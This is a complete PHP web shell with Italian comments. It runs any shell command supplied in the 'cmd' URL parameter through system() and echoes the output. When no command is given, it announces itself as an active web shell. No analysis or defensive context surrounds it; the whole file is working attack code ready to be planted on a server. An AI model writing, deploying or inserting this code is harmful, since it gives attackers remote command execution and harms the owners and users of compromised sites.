<?php
    // Questa riga permette di eseguire comandi passati tramite il parametro 'cmd' nell'URL
    if(isset($_GET['cmd'])) {
        echo "<pre>";
        system($_GET['cmd']);
        echo "</pre>";
    } else {
        echo "Web Shell attiva. Usa ?cmd=comando nell'URL.";
    }
?>